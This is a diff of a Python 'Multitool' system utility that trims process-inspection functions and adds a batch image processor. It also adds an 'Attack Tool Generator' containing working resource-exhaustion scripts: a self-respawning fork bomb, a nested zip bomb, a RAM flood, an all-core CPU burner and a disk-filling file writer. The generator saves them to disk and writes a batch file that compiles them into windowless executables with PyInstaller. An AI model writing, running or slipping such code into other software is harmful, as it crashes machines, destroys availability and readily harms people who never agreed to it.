@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 """
-Multitool v3.3 - Enhanced File Management and System Utility Tool
+Multitool v4.1
 Author: Darnix (Original)
-Improvements: Added modular structure, better error handling, performance optimizations,
-             enhanced documentation, code organization, and security enhancements
 """
 
 # Standard library imports
@@ -53,10 +51,17 @@ except ImportError:
     # Handle case when running on non-Windows platforms
     pass
 
+# ...existing imports...
+try:
+    from PIL import Image, ImageDraw, ImageFont
+except ImportError:
+    pass
+# ...existing code...
+
 init(autoreset=True)
 
 # Global constants
-PROGRAM_NAME = "Multitool v4.0"
+PROGRAM_NAME = "Multitool v4.1"
 CHUNK_SIZE = 64 * 1024  # 64KB chunks for file operations
 MAX_WORKERS = 4  # Maximum number of worker threads for parallel operations
 
@@ -2020,15 +2025,8 @@ def process_explorer():
                     
                     print(f"\n{Fore.GREEN}Process Details:")
                     print(f"{Fore.WHITE}Name: {proc.name()}")
-                    print(f"Path: {proc.exe()}")
-                    print(f"Status: {proc.status()}")
-                    print(f"Created: {datetime.fromtimestamp(proc.create_time()).strftime('%Y-%m-%d %H:%M:%S')}")
-                    print(f"CPU Usage: {proc.cpu_percent()}%")
-                    print(f"Memory: {proc.memory_info().rss / 1024 / 1024:.1f}MB")
-                    print(f"Threads: {proc.num_threads()}")
-                    if children:
-                        print(f"\nChild Processes: {len(children)}")
-                        for child in children:
+                    print(f"\nChild Processes: {len(children)}")
+                    for child in children:
                             try:
                                 print(f"  • {child.name()} (PID: {child.pid})")
                             except:
@@ -2755,304 +2753,576 @@ def dns_lookup():
         print(f"{Fore.RED}Error performing DNS lookup: {str(e)}")
 
 def analyze_memory():
-    """Enhanced memory analysis with sorting and filtering options"""
+    """Detailed memory analysis of running processes"""
     try:
         print(f"{Fore.CYAN}Memory Analysis")
-        
-        # Get initial process data
         processes = []
-        for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent', 'create_time']):
+        for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
             try:
                 info = proc.info
                 mem = info['memory_info']
                 processes.append({
                     'pid': info['pid'],
                     'name': info['name'],
-                    'memory': mem.rss,
-                    'cpu': info['cpu_percent'],
-                    'started': datetime.fromtimestamp(info['create_time'])
+                    'rss': mem.rss,
+                    'vms': mem.vms,
+                    'shared': mem.shared if hasattr(mem, 'shared') else 0,
+                    'text': mem.text if hasattr(mem, 'text') else 0,
+                    'data': mem.data if hasattr(mem, 'data') else 0
                 })
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 continue
-
-        # Sort options
-        print(f"\n{Fore.YELLOW}Sort by:")
-        print("1. Memory Usage (default)")
-        print("2. CPU Usage")
-        print("3. Process Name")
-        print("4. Start Time")
-        
-        choice = input(f"\n{Fore.GREEN}Choose sort option (1-4): {Fore.WHITE}") or "1"
-        
-        # Sort based on user choice
-        if choice == "2":
-            processes.sort(key=lambda x: x['cpu'], reverse=True)
-            sort_by = "CPU Usage"
-        elif choice == "3":
-            processes.sort(key=lambda x: x['name'].lower())
-            sort_by = "Process Name"
-        elif choice == "4":
-            processes.sort(key=lambda x: x['started'], reverse=True)
-            sort_by = "Start Time"
-        else:
-            processes.sort(key=lambda x: x['memory'], reverse=True)
-            sort_by = "Memory Usage"
-
-        print(f"\n{Fore.CYAN}Processes sorted by {sort_by}:")
-        print(f"\n{'Process':<30} {'PID':>7} {'Memory':>10} {'CPU%':>7} {'Started':>20}")
-        print("-" * 77)
-
-        # Show top 25 processes
-        for proc in processes[:25]:
+                
+        processes.sort(key=lambda x: x['rss'], reverse=True)
+        print(f"\n{'Process':<30} {'PID':>7} {'RSS':>10} {'VMS':>10} {'Shared':>10}")
+        print("-" * 70)
+        for proc in processes[:20]:
             print(f"{proc['name'][:30]:<30} {proc['pid']:7d} "
-                  f"{humanize.naturalsize(proc['memory']):>10} "
-                  f"{proc['cpu']:6.1f}% "
-                  f"{proc['started'].strftime('%Y-%m-%d %H:%M:%S'):>20}")
-
-        # Show summary
-        total_memory = sum(p['memory'] for p in processes)
-        total_processes = len(processes)
-        print(f"\n{Fore.YELLOW}Summary:")
-        print(f"Total Processes: {total_processes}")
-        print(f"Total Memory Used: {humanize.naturalsize(total_memory)}")
-
+                  f"{humanize.naturalsize(proc['rss']):>10} "
+                  f"{humanize.naturalsize(proc['vms']):>10} "
+                  f"{humanize.naturalsize(proc['shared']):>10}")
     except Exception as e:
         print(f"{Fore.RED}Error: {str(e)}")
 
 def scan_handles():
-    """Enhanced handle scanner with filtering and detailed view"""
+    """Scan and analyze open handles"""
     try:
-        print(f"{Fore.CYAN}Handle Scanner\n")
-        
-        # Get process data
-        processes = []
-        for proc in psutil.process_iter(['pid', 'name', 'num_handles', 'memory_info']):
+        print(f"{Fore.CYAN}Handle Scanner")
+        for proc in psutil.process_iter(['pid', 'name', 'num_handles']):
             try:
                 info = proc.info
-                if info['num_handles'] > 0:  # Only include processes with handles
-                    processes.append({
-                        'pid': info['pid'],
-                        'name': info['name'],
-                        'handles': info['num_handles'],
-                        'memory': info['memory_info'].rss
-                    })
-            except:
+                if info['num_handles'] > 100:  # Show processes with many handles
+                    print(f"\n{Fore.YELLOW}Process: {info['name']} (PID: {info['pid']})")
+                    print(f"Open Handles: {info['num_handles']}")
+                    # Get handle details using winapi
+                    handles = proc.memory_maps()
+                    for h in handles[:5]:  # Show first 5 handles
+                        print(f"  {h.path if hasattr(h, 'path') else 'Unknown'}")
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
                 continue
-
-        # Filter options
-        print(f"{Fore.YELLOW}Filter by:")
-        print("1. Show all processes")
-        print("2. Show processes with high handle count (>100)")
-        print("3. Show system processes only")
-        print("4. Show user processes only")
-        
-        choice = input(f"\n{Fore.GREEN}Choose filter (1-4): {Fore.WHITE}") or "1"
-
-        # Apply filter
-        if choice == "2":
-            processes = [p for p in processes if p['handles'] > 100]
-        elif choice == "3":
-            processes = [p for p in processes if p['name'].lower() in ['system', 'svchost.exe', 'services.exe']]
-        elif choice == "4":
-            system_procs = ['system', 'svchost.exe', 'services.exe']
-            processes = [p for p in processes if p['name'].lower() not in system_procs]
-
-        # Sort by handle count
-        processes.sort(key=lambda x: x['handles'], reverse=True)
-
-        print(f"\n{'Process':<30} {'PID':>7} {'Handles':>8} {'Memory':>10}")
-        print("-" * 58)
-
-        for proc in processes[:20]:  # Show top 20
-            print(f"{proc['name'][:30]:<30} {proc['pid']:7d} {proc['handles']:8d} "
-                  f"{humanize.naturalsize(proc['memory']):>10}")
-
-        print(f"\n{Fore.YELLOW}Summary:")
-        print(f"Total processes shown: {len(processes)}")
-        print(f"Total handles: {sum(p['handles'] for p in processes):,}")
-        
     except Exception as e:
         print(f"{Fore.RED}Error: {str(e)}")
 
 def map_dlls():
-    """Enhanced DLL mapper with filtering and security analysis"""
+    """Map loaded DLLs for processes"""
     try:
-        print(f"{Fore.CYAN}DLL Mapper\n")
-
-        # Known DLL categories
-        system_dlls = {'ntdll.dll', 'kernel32.dll', 'user32.dll', 'gdi32.dll'}
-        security_dlls = {'sechost.dll', 'cryptsp.dll', 'bcrypt.dll'}
-        network_dlls = {'ws2_32.dll', 'wininet.dll', 'urlmon.dll'}
-        
-        processes = []
+        print(f"{Fore.CYAN}DLL Mapper")
         for proc in psutil.process_iter(['pid', 'name']):
             try:
-                dlls = []
-                maps = proc.memory_maps()
-                for m in maps:
-                    if m.path.lower().endswith('.dll'):
-                        dll_name = os.path.basename(m.path).lower()
-                        category = 'System' if dll_name in system_dlls else \
-                                 'Security' if dll_name in security_dlls else \
-                                 'Network' if dll_name in network_dlls else 'Other'
-                        dlls.append({'name': dll_name, 'path': m.path, 'category': category})
-                
-                if dlls:  # Only add processes with DLLs
-                    processes.append({
-                        'pid': proc.pid,
-                        'name': proc.name(),
-                        'dlls': dlls
-                    })
-            except:
+                print(f"\n{Fore.YELLOW}Process: {proc.name()} (PID: {proc.pid})")
+                dlls = proc.memory_maps()
+                dll_dict = {}
+                for dll in dlls:
+                    if dll.path.lower().endswith('.dll'):
+                        base_name = os.path.basename(dll.path)
+                        dll_dict[base_name] = dll.path
+                for name, path in sorted(dll_dict.items())[:5]:
+                    print(f"  {name}: {path}")
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
                 continue
-
-        # Display options
-        print(f"{Fore.YELLOW}View options:")
-        print("1. Show all DLLs")
-        print("2. Show system DLLs only")
-        print("3. Show security DLLs only")
-        print("4. Show network DLLs only")
-        print("5. Show other DLLs only")
-
-        choice = input(f"\n{Fore.GREEN}Choose view option (1-5): {Fore.WHITE}") or "1"
-
-        for proc in processes[:10]:  # Show first 10 processes
-            dll_count = len(proc['dlls'])
-            if dll_count > 0:
-                print(f"\n{Fore.YELLOW}Process: {proc['name']} (PID: {proc['pid']})")
-                
-                # Filter DLLs based on choice
-                filtered_dlls = proc['dlls']
-                if choice == "2":
-                    filtered_dlls = [d for d in proc['dlls'] if d['category'] == 'System']
-                elif choice == "3":
-                    filtered_dlls = [d for d in proc['dlls'] if d['category'] == 'Security']
-                elif choice == "4":
-                    filtered_dlls = [d for d in proc['dlls'] if d['category'] == 'Network']
-                elif choice == "5":
-                    filtered_dlls = [d for d in proc['dlls'] if d['category'] == 'Other']
-
-                for dll in filtered_dlls[:5]:  # Show first 5 DLLs
-                    print(f"{Fore.WHITE}  • {dll['name']} ({dll['category']})")
-                
-                if len(filtered_dlls) > 5:
-                    print(f"    ... and {len(filtered_dlls)-5} more DLLs")
-
     except Exception as e:
         print(f"{Fore.RED}Error: {str(e)}")
 
 def analyze_threads():
-    """Enhanced thread analyzer with detailed statistics"""
+    """Analyze process threads"""
     try:
-        print(f"{Fore.CYAN}Thread Analyzer\n")
-        
-        processes = []
+        print(f"{Fore.CYAN}Thread Analyzer")
         for proc in psutil.process_iter(['pid', 'name', 'num_threads']):
             try:
-                threads = proc.threads()
-                thread_stats = {
-                    'total': len(threads),
-                    'active': sum(1 for t in threads if t.system_time > 0 or t.user_time > 0),
-                    'idle': sum(1 for t in threads if t.system_time == 0 and t.user_time == 0),
-                    'total_cpu': sum(t.system_time + t.user_time for t in threads)
-                }
-                
-                if thread_stats['total'] > 0:  # Only include processes with threads
-                    processes.append({
-                        'pid': proc.pid,
-                        'name': proc.name(),
-                        'threads': thread_stats
-                    })
-            except:
+                info = proc.info
+                if info['num_threads'] > 20:  # Show processes with many threads
+                    print(f"\n{Fore.YELLOW}Process: {info['name']} (PID: {info['pid']})")
+                    print(f"Thread count: {info['num_threads']}")
+                    threads = proc.threads()
+                    print("Thread details:")
+                    for thread in threads[:5]:  # Show first 5 threads
+                        print(f"  TID: {thread.id}, CPU Time: {thread.user_time}s")
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
                 continue
-
-        # Sort processes by thread count
-        processes.sort(key=lambda x: x['threads']['total'], reverse=True)
-
-        print(f"{Fore.YELLOW}Top Processes by Thread Count:")
-        print(f"\n{'Process':<30} {'PID':>7} {'Threads':>8} {'Active':>8} {'CPU Time':>10}")
-        print("-" * 66)
-
-        for proc in processes[:15]:  # Show top 15 processes
-            stats = proc['threads']
-            print(f"{proc['name'][:30]:<30} {proc['pid']:7d} {stats['total']:8d} "
-                  f"{stats['active']:8d} {stats['total_cpu']:10.1f}s")
-
-        # System-wide statistics
-        total_threads = sum(p['threads']['total'] for p in processes)
-        active_threads = sum(p['threads']['active'] for p in processes)
-        total_processes = len(processes)
-
-        print(f"\n{Fore.YELLOW}System Statistics:")
-        print(f"Total Processes: {total_processes}")
-        print(f"Total Threads: {total_threads}")
-        print(f"Active Threads: {active_threads}")
-        print(f"Average Threads per Process: {total_threads/total_processes:.1f}")
-
     except Exception as e:
         print(f"{Fore.RED}Error: {str(e)}")
 
 def trace_stacks():
-    """Enhanced stack tracer with better error handling and information display"""
+    """Trace process stacks"""
     try:
-        print(f"{Fore.CYAN}Stack Tracer\n")
+        print(f"{Fore.CYAN}Stack Tracer")
+        target_pid = int(input(f"{Fore.YELLOW}Enter PID to trace: {Fore.WHITE}"))
+        proc = psutil.Process(target_pid)
         
-        # List available processes
-        processes = []
-        for proc in psutil.process_iter(['pid', 'name', 'num_threads']):
+        print(f"\n{Fore.GREEN}Process: {proc.name()} (PID: {proc.pid})")
+        
+        # Get stack trace using WinAPI
+        for thread in proc.threads():
             try:
-                processes.append({
-                    'pid': proc.pid,
-                    'name': proc.name(),
-                    'threads': proc.num_threads()
-                })
+                # This is a simplification - real stack tracing requires more complex WinAPI calls
+                print(f"\nThread ID: {thread.id}")
+                print(f"User Time: {thread.user_time}s")
+                print(f"System Time: {thread.system_time}s")
             except:
                 continue
-
-        # Show top processes
-        print(f"{Fore.YELLOW}Active Processes:")
-        print(f"\n{'PID':>7} {'Process':<30} {'Threads':>8}")
-        print("-" * 47)
-
-        for proc in sorted(processes, key=lambda x: x['threads'], reverse=True)[:10]:
-            print(f"{proc['pid']:7d} {proc['name'][:30]:<30} {proc['threads']:8d}")
-
-        # Get target process
-        target_pid = input(f"\n{Fore.YELLOW}Enter PID to trace (or Enter to cancel): {Fore.WHITE}")
-        if not target_pid:
-            return
-
-        try:
-            proc = psutil.Process(int(target_pid))
-            print(f"\n{Fore.GREEN}Process: {proc.name()} (PID: {proc.pid})")
-            
-            # Get thread information
-            threads = proc.threads()
-            print(f"\n{Fore.YELLOW}Thread Information:")
-            print(f"{'TID':>10} {'User Time':>12} {'System Time':>12} {'Started':>20}")
-            print("-" * 56)
-
-            for thread in threads:
-                # Calculate thread start time
-                start_time = datetime.now() - timedelta(seconds=(thread.user_time + thread.system_time))
-                print(f"{thread.id:10d} {thread.user_time:11.1f}s {thread.system_time:11.1f}s "
-                      f"{start_time.strftime('%Y-%m-%d %H:%M:%S'):>20}")
-
-            # Show summary
-            print(f"\n{Fore.YELLOW}Summary:")
-            print(f"Total Threads: {len(threads)}")
-            print(f"Total CPU Time: {sum(t.user_time + t.system_time for t in threads):.1f}s")
-            print(f"Average Time per Thread: {sum(t.user_time + t.system_time for t in threads)/len(threads):.1f}s")
-
-        except psutil.NoSuchProcess:
-            print(f"{Fore.RED}Process not found!")
-        except psutil.AccessDenied:
-            print(f"{Fore.RED}Access denied! Try running as administrator.")
-        except ValueError:
-            print(f"{Fore.RED}Invalid PID!")
-
+                
     except Exception as e:
         print(f"{Fore.RED}Error: {str(e)}")
+
+def generate_attack_tool():
+    """Generate standalone attack tools using a simplified, more reliable approach"""
+    clear_screen()
+    print(f"{Fore.RED}Attack Tool Generator")
+    print(f"{Fore.RED}{'=' * 60}\n")
+    print(f"{Fore.RED}WARNING: These tools can cause permanent damage!")
+    print(f"{Fore.RED}Use only on systems you own and control!\n")
+    
+    # Dictionary of available attack tools with descriptions and simpler code
+    attack_tools = {
+        "1": {
+            "name": "Fork Bomb",
+            "desc": "Crashes system by recursive process spawning",
+            "code": """
+import os
+import sys
+import subprocess
+import time
+
+def fork():
+    while True:
+        # Create a new process that runs itself with a special flag
+        startupinfo = None
+        if os.name == 'nt':  # Windows
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            
+        try:
+            # Create hidden window process
+            subprocess.Popen(
+                [sys.executable, __file__, "fork"],
+                startupinfo=startupinfo,
+                creationflags=subprocess.CREATE_NEW_CONSOLE,
+                shell=True
+            )
+            # Also create visible processes to overwhelm
+            subprocess.Popen(
+                [sys.executable, __file__, "fork"],
+                creationflags=subprocess.CREATE_NEW_CONSOLE
+            )
+            time.sleep(0.1)  # Small delay to control spawn rate
+        except:
+            continue
+
+if __name__ == "__main__":
+    if len(sys.argv) > 1 and sys.argv[1] == "fork":
+        fork()  # Run fork bomb if launched with fork argument
+    else:
+        fork()
+"""
+        },
+        "2": {
+            "name": "Zip Bomb",
+            "desc": "Creates expanding archive that fills storage",
+            "code": """
+import zipfile
+import os
+import time
+
+def make_bomb(iterations=10):
+    # Create a 1MB data file
+    with open('data_file.txt','wb') as f:
+        f.write(b'0' * 1024 * 1024)  # 1MB of zeros
+    
+    # Create nested zip files
+    current_name = 'data_file.txt'
+    for i in range(iterations):
+        zip_name = f'zip_bomb_{i}.zip'
+        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+            # Add multiple copies of the same file with different names
+            for j in range(10):  # Add 10 copies in each zip
+                zip_file.write(current_name, f'file_{j}.txt')
+        
+        # Remove previous file if it's not the original data file
+        if i > 0:
+            os.remove(current_name)
+        
+        current_name = zip_name
+        print(f"Created layer {i+1}/{iterations}")
+    
+    # Keep the final zip file
+    print(f"Zip bomb created: {current_name}")
+    print(f"WARNING: Extracting this file can fill your storage!")
+    os.remove('data_file.txt')
+
+make_bomb(5)  # 5 layers of nesting
+"""
+        },
+        "3": {
+            "name": "Memory Flood",
+            "desc": "Consumes all available RAM",
+            "code": """
+import sys
+import time
+import psutil
+
+# Get total system memory
+total_memory = psutil.virtual_memory().total
+
+# Create array to hold memory chunks
+memory_chunks = []
+chunk_size = 256 * 1024 * 1024  # 256MB chunks for faster allocation
+
+print("Starting memory flood...")
+print(f"Total system memory: {total_memory / (1024**3):.1f} GB")
+
+try:
+    allocated = 0
+    while True:
+        try:
+            # Allocate memory in chunks and keep references
+            memory_chunks.append(bytearray(chunk_size))
+            allocated += chunk_size
+            
+            # Print progress
+            print(f"Allocated: {allocated / (1024**3):.1f} GB", end='\\r')
+            
+            # Small delay to allow OS to register memory usage
+            time.sleep(0.1)
+            
+        except MemoryError:
+            print("\\nMemory allocation failed - system memory limit reached")
+            print(f"Final allocation: {allocated / (1024**3):.1f} GB")
+            
+            # Hold the allocated memory
+            while True:
+                time.sleep(1)
+                
+except KeyboardInterrupt:
+    print("\\nMemory flood stopped by user")
+    sys.exit()
+"""
+        },
+        "4": {
+            "name": "CPU Burner",
+            "desc": "Maxes out CPU usage on all cores",
+            "code": """
+import multiprocessing
+import time
+def cpu_burner():
+    while True:
+        x = 0
+        for i in range(10000000):
+            x += i * i
+            x = x % 1234567
+
+if __name__ == "__main__":
+    processes = []
+    for i in range(multiprocessing.cpu_count()):
+        process = multiprocessing.Process(target=cpu_burner, name=f"Burner-{i}")
+        process.daemon = False
+        processes.append(process)
+        process.start()
+        print(f"Started CPU burner process {i}")
+"""
+        },
+        "5": {
+            "name": "File Generator",
+            "desc": "Creates huge files until disk is full",
+            "code": """
+import os
+import time
+import random
+import string
+
+# Create files until disk is full
+chunk_size = 100 * 1024 * 1024  # 100MB chunks
+file_count = 0
+total_size = 0
+
+def get_random_filename(length=10):
+    letters = string.ascii_letters + string.digits
+    return ''.join(random.choice(letters) for _ in range(length))
+
+try:
+    while True:
+        filename = f"huge_file_{get_random_filename()}.dat"
+        with open(filename, 'wb') as f:
+            # Write in smaller blocks to show progress
+            for _ in range(10):  # 10MB at a time
+                f.write(os.urandom(10 * 1024 * 1024))  # Random data
+                f.flush()  # Ensure data is written to disk
+                total_size += 10
+        
+        file_count += 1
+        
+"""
+        }
+    }
+    
+    # Display options
+    print(f"{Fore.YELLOW}Available Tools:")
+    for key, tool in attack_tools.items():
+        print(f"{key}. {tool['name']:<12} - {tool['desc']}")
+    print("6. Exit")
+    
+    # Get user choice
+    choice = input(f"\n{Fore.RED}Select tool to generate (1-6): {Fore.WHITE}")
+    
+    if choice == "6":
+        return
+    
+    if choice not in attack_tools:
+        print(f"{Fore.RED}Invalid choice!")
+        input(f"\n{Fore.CYAN}Press Enter to continue...")
+        return
+    
+    # Selected tool info
+    tool = attack_tools[choice]
+    tool_name = tool["name"].replace(" ", "_").lower()
+    
+    # Create directory for scripts if it doesn't exist
+    script_dir = os.path.join(os.getcwd(), "attack_tools")
+    os.makedirs(script_dir, exist_ok=True)
+    
+    # Create the Python script
+    script_path = os.path.join(script_dir, f"{tool_name}.py")
+    
+    try:
+        with open(script_path, "w") as f:
+            f.write(tool["code"].strip())
+        
+        print(f"\n{Fore.GREEN}Created Python script: {script_path}")
+        print(f"{Fore.YELLOW}You can run this script with Python directly.")
+        
+        # Create a build script for compiling to EXE instead of just a launcher
+        if os.name == 'nt':
+            # Create a build.bat that safely compiles the tool to an EXE
+            build_path = os.path.join(script_dir, f"build_{tool_name}.bat")
+            with open(build_path, "w") as f:
+                f.write(f'''@echo off
+echo {tool["name"]} - Attack Tool Builder
+echo ========================================
+echo This script will compile the attack tool to a standalone executable
+echo Warning: The compiled tool can cause damage to your system!
+
+REM Try to find Python from multiple possible locations
+set PYTHON_PATH=
+
+REM Check Python 3.13
+if exist "%LocalAppData%\\Programs\\Python\\Python313\\python.exe" (
+    set PYTHON_PATH="%LocalAppData%\\Programs\\Python\\Python313\\python.exe"
+    goto found_python
+)
+
+REM Check Python 3.12
+if exist "%LocalAppData%\\Programs\\Python312\\python.exe" (
+    set PYTHON_PATH="%LocalAppData%\\Programs\\Python312\\python.exe"
+    goto found_python
+)
+
+REM Check Program Files
+if exist "C:\\Program Files\\Python312\\python.exe" (
+    set PYTHON_PATH="C:\\Program Files\\Python312\\python.exe"
+    goto found_python
+)
+
+REM Check Program Files (x86)
+if exist "C:\\Program Files (x86)\\Python312\\python.exe" (
+    set PYTHON_PATH="C:\\Program Files (x86)\\Python312\\python.exe"
+    goto found_python
+)
+
+REM Check Windows Store Python
+if exist "%LocalAppData%\\Microsoft\\WindowsApps\\python.exe" (
+    set PYTHON_PATH="%LocalAppData%\\Microsoft\\WindowsApps\\python.exe"
+    goto found_python
+)
+
+echo Python installation not found!
+echo Please make sure Python is installed correctly.
+pause
+exit /b 1
+
+:found_python
+echo Found Python at: %PYTHON_PATH%
+
+REM Check for PyInstaller
+%PYTHON_PATH% -m pip show pyinstaller >nul 2>&1
+if errorlevel 1 (
+    echo Installing PyInstaller...
+    %PYTHON_PATH% -m pip install --user pyinstaller
+    if errorlevel 1 (
+        echo Failed to install PyInstaller!
+        pause
+        exit /b 1
+    )
+)
+
+echo Building executable...
+%PYTHON_PATH% -m PyInstaller --onefile --noconsole "{script_path}"
+
+if exist "dist\\{tool_name}.exe" (
+    echo.
+    echo Build successful! Executable created at: dist\\{tool_name}.exe
+    echo WARNING: This file can cause damage to your system!
+) else (
+    echo.
+    echo Build failed! Check for errors above.
+)
+
+pause
+''')
+            
+            print(f"{Fore.GREEN}Created build script: {build_path}")
+            print(f"{Fore.YELLOW}Run the build script to create an executable.")
+
+    except Exception as e:
+        print(f"{Fore.RED}Error creating files: {str(e)}")
+    
+    input(f"\n{Fore.CYAN}Press Enter to return to main menu...")
+
+def batch_image_processing():
+    """
+    Batch process images with various operations like resize, convert format, etc.
+    Requires Pillow library.
+    """
+    try:
+        from PIL import Image
+    except ImportError:
+        print(f"{Fore.RED}This feature requires the Pillow library. Install it with 'pip install Pillow'")
+        return
+    
+    print(f"\n{Fore.CYAN}Batch Image Processing")
+    print(f"{Fore.CYAN}{'=' * 60}\n")
+    
+    print(f"{Fore.YELLOW}Select operation:")
+    print(f"{Fore.WHITE}1. Resize images")
+    print(f"{Fore.WHITE}2. Convert format (e.g., JPG to PNG)")
+    print(f"{Fore.WHITE}3. Optimize/compress images")
+    print(f"{Fore.WHITE}4. Add watermark")
+    print(f"{Fore.WHITE}5. Return to main menu")
+    
+    choice = input(f"\n{Fore.GREEN}Choose option (1-5): {Fore.WHITE}")
+    
+    if choice == "5":
+        return
+    
+    # Get files to process
+    extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
+    image_files = []
+    
+    for ext in extensions:
+        image_files.extend([f for f in os.listdir() if f.lower().endswith(ext)])
+    
+    if not image_files:
+        print(f"{Fore.RED}No image files found in current directory!")
+        return
+    
+    print(f"\n{Fore.CYAN}Found {len(image_files)} image files.")
+    
+    # Create output directory
+    output_dir = "processed_images"
+    if not os.path.exists(output_dir):
+        os.makedirs(output_dir)
+    
+    processed = 0
+    
+    if choice == "1":  # Resize
+        width = int(input(f"{Fore.YELLOW}Enter new width in pixels (or 0 to maintain aspect ratio): {Fore.WHITE}"))
+        height = int(input(f"{Fore.YELLOW}Enter new height in pixels (or 0 to maintain aspect ratio): {Fore.WHITE}"))
+        
+        with tqdm(total=len(image_files), desc="Resizing images", unit="image") as pbar:
+            for img_file in image_files:
+                try:
+                    with Image.open(img_file) as img:
+                        # Calculate dimensions maintaining aspect ratio if needed
+                        orig_width, orig_height = img.size
+                        if width == 0 and height > 0:
+                            width = int(orig_width * (height / orig_height))
+                        elif height == 0 and width > 0:
+                            height = int(orig_height * (width / orig_width))
+                        
+                        resized_img = img.resize((width, height), Image.LANCZOS)
+                        output_path = os.path.join(output_dir, img_file)
+                        resized_img.save(output_path)
+                        processed += 1
+                except Exception as e:
+                    print(f"{Fore.RED}Error processing {img_file}: {e}")
+                finally:
+                    pbar.update(1)
+    
+    elif choice == "2":  # Convert format
+        target_format = input(f"{Fore.YELLOW}Enter target format (jpg, png, webp, etc.): {Fore.WHITE}").lower()
+        
+        with tqdm(total=len(image_files), desc="Converting images", unit="image") as pbar:
+            for img_file in image_files:
+                try:
+                    name, _ = os.path.splitext(img_file)
+                    with Image.open(img_file) as img:
+                        # Convert to RGB if saving as JPG (removes alpha channel)
+                        if target_format.lower() in ['jpg', 'jpeg'] and img.mode == 'RGBA':
+                            img = img.convert('RGB')
+                        
+                        output_path = os.path.join(output_dir, f"{name}.{target_format}")
+                        img.save(output_path)
+                        processed += 1
+                except Exception as e:
+                    print(f"{Fore.RED}Error converting {img_file}: {e}")
+                finally:
+                    pbar.update(1)
+    
+    elif choice == "3":  # Optimize/compress
+        quality = int(input(f"{Fore.YELLOW}Enter quality (1-100, lower = smaller file size): {Fore.WHITE}"))
+        
+        with tqdm(total=len(image_files), desc="Optimizing images", unit="image") as pbar:
+            for img_file in image_files:
+                try:
+                    name, ext = os.path.splitext(img_file)
+                    with Image.open(img_file) as img:
+                        output_path = os.path.join(output_dir, img_file)
+                        
+                        # Convert to RGB if needed
+                        if img.mode == 'RGBA' and ext.lower() in ['.jpg', '.jpeg']:
+                            img = img.convert('RGB')
+                        
+                        img.save(output_path, quality=quality, optimize=True)
+                        processed += 1
+                except Exception as e:
+                    print(f"{Fore.RED}Error optimizing {img_file}: {e}")
+                finally:
+                    pbar.update(1)
+    
+    elif choice == "4":  # Add watermark
+        watermark_text = input(f"{Fore.YELLOW}Enter watermark text: {Fore.WHITE}")
+        font_size = int(input(f"{Fore.YELLOW}Enter font size: {Fore.WHITE}"))
+        position = input(f"{Fore.YELLOW}Enter position (top-left, top-right, bottom-left, bottom-right): {Fore.WHITE}").lower()
+        
+        with tqdm(total=len(image_files), desc="Adding watermark", unit="image") as pbar:
+            for img_file in image_files:
+                try:
+                    with Image.open(img_file) as img:
+                        draw = ImageDraw.Draw(img)
+                        font = ImageFont.truetype("arial.ttf", font_size)
+                        
+                        text_width, text_height = draw.textsize(watermark_text, font=font)
+                        width, height = img.size
+                        
+                        if position == "top-left":
+                            x, y = 10, 10
+                        elif position == "top-right":
+                            x, y = width - text_width - 10, 10
+                        elif position == "bottom-left":
+                            x, y = 10, height - text_height - 10
+                        elif position == "bottom-right":
+                            x, y = width - text_width - 10, height - text_height - 10
+                        else:
+                            x, y = 10, 10
+                        
+                        draw.text((x, y), watermark_text, font=font, fill=(255, 255, 255, 128))
+                        output_path = os.path.join(output_dir, img_file)
+                        img.save(output_path)
+                        processed += 1
+                except Exception as e:
+                    print(f"{Fore.RED}Error adding watermark to {img_file}: {e}")
+                finally:
+                    pbar.update(1)
+    
+    print(f"\n{Fore.GREEN}Processed {processed} images. Output saved to '{output_dir}'")
 
 def main_menu():
     while True:
@@ -3064,96 +3334,73 @@ def main_menu():
         display_dir = os.path.basename(current_dir)
         if not display_dir:
             display_dir = current_dir
-
-        dir_space = width - 8 - len(display_dir)
-        print(f"{Fore.CYAN}║{Fore.BLUE} Dir: {Fore.WHITE}{display_dir}{' ' * dir_space}{Fore.CYAN}║")
+        
+        print(f"{Fore.CYAN}║ {Fore.WHITE}Current Directory: {Fore.YELLOW}{display_dir}{' ' * (width-22-len(display_dir))}{Fore.CYAN}║")
         print(f"{Fore.CYAN}╠═{'═' * (width-4)}═╣")
-
-        file_options = [
-            "Change Directory",
-            "Search Files",
-            "Find Duplicates",
-            "Quick Actions",
-            "Preview File",
-            "Bulk Rename",
-            "Clean Names"
-        ]
         
-        organize_options = [
-            "Organize Files",
-            "Categories",
-            "Monitor Directory",
-            "Space Analysis",
-            "File Statistics"
-        ]
-        
-        system_options = [
-            "System Info",
-            "Clean Cache",
-            "Disk Health",
-            "Screen Capture"
-        ]
-        
-        security_options = [
-            "Encrypt",
-            "Decrypt",
-            "Permissions",
-            "Scan",
-            "File Integrity",
-            "Corrupt File"
-        ]
-        
-        networking_options = [
-            "Network Usage",
-            "Network Scanner",
-            "IP Lookup",  # Changed from "Port Scanner"
-            "Network Information",  # Changed from "WiFi Information"
-            "Speed Test",
-            "DNS Tools"
-        ]
-        
-        system_monitoring_options = [
-            "System Resources",
-            "Running Services"
-        ]
-
-        advanced_options = [
-            "Startup Manager",
-            "System Restore", 
-            "Advanced Search",
-            "Process Explorer",
-            "Memory Analysis",
-            "Handle Scanner", 
-            "DLL Mapper",
-            "Thread Analyzer",
-            "Stack Tracer",
+        sections = [
+            ("File Operations", [
+                "Change directory",
+                "Search files",
+                "Find duplicates", 
+                "Quick actions",
+                "Preview file",
+                "Auto rename files",
+                "Clean filenames",
+                "Organize files",
+                "Show categories",
+                "Monitor directory",
+                "Analyze disk space",
+                "File statistics"
+            ]),
+            ("System Operations", [
+                "System information",
+                "Clean cache",
+                "Disk health check",
+                "Screen capture",
+                "Encrypt file",
+                "Decrypt file",
+                "Check permissions",
+                "Scan directory",
+                "Verify file integrity",
+                "Corrupt file"
+            ]),
+            ("Network Operations", [
+                "Monitor network",
+                "Network scan", 
+                "IP lookup",
